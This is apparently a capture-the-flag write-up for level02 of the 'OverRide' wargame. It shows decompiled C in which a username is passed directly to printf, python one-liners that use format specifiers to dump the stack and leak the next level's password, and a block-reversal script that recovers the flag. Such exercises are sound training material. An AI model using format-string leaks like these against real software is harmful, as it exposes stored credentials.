This binary take 2 differents inputs from fgets on STDIN too.

	level02@OverRide:~$ ./level02 
	===== [ Secure Access System v1.0 ] =====
	/***************************************\
	| You must login to access this system. |
	\**************************************/
	--[ Username: test
	--[ Password: test
	*****************************************
	test does not have access!

When we reverse the program in Ghidra we can that the code open the level3 .pass, store it inside a variable and compares it with the password

```c
	local_10 = fopen("/home/users/level03/.pass","r");
	if (local_10 == (FILE *)0x0) {
	    fwrite("ERROR: failed to open password file\n",1,0x24,stderr);
	        // WARNING: Subroutine does not return
		exit(1);
	}
	sVar2 = fread(local_a8,1,0x29,local_10);
	...
	printf("--[ Password: ");
	fgets(local_118,100,stdin);
	puts("*****************************************");
	iVar1 = strncmp(local_a8,local_118,0x29);
	if (iVar1 == 0) {
	  printf("Greetings, %s!\n",local_78);
	  system("/bin/sh");
	  return 0;
	}
	printf(local_78);
  	puts(" does not have access!");
        // WARNING: Subroutine does not return
	exit(1);
```

The more important part in the code above is the **local_78** in printf, this function is vulnerable to format string attack. We will use the Username to get the password stored before by printing stack variable with %x format inside Username.

	level02@OverRide:~$ python -c 'print "%lx " * 80' | ./level02 
	===== [ Secure Access System v1.0 ] =====
	/***************************************\
	| You must login to access this system. |
	\**************************************/
	--[ Username: --[ Password: *****************************************
	7fffffffe4f0 0 20 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 7fffffffe6e8 1f7ff9a08 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 786c2520786c2520 1006c2520 0 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 does not have access!

There we can see a lot of hex numbers, *2a2a2a2a2a2a2a2a* is for the * etc, the flag will start at *756e505234376848* but after converting it in ascii char we can see that **unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXs** is not the same size ad usual flag, so we have lost something along the way.

The key is that the password take too much place to be printed right away, so we must only print the flag.

	level02@OverRide:~$ python -c 'print "%22$lx " + "%23$lx " +"%24$lx " +"%25$lx " + "%26$lx" ' | ./level02 
	===== [ Secure Access System v1.0 ] =====
	/***************************************\
	| You must login to access this system. |
	\**************************************/
	--[ Username: --[ Password: *****************************************
	756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d does not have access!

We get this flag **unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M**, since the hex are printed in little endian format we must reverse each block of 8 char with a little python script.

```py
def reverse_blocks(s, block_size=8):
    # Split the string into blocks of 'block_size' length
    chunks = [s[i:i+block_size] for i in range(0, len(s), block_size)]
    
    # Reverse each block
    reversed_chunks = [chunk[::-1] for chunk in chunks]
    
    # Join the reversed blocks into a single string
    return ''.join(reversed_chunks)

# Example usage
input_string = "unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M"
output_string = reverse_blocks(input_string)
print(output_string)
```
Then we get the flag for the level03 !

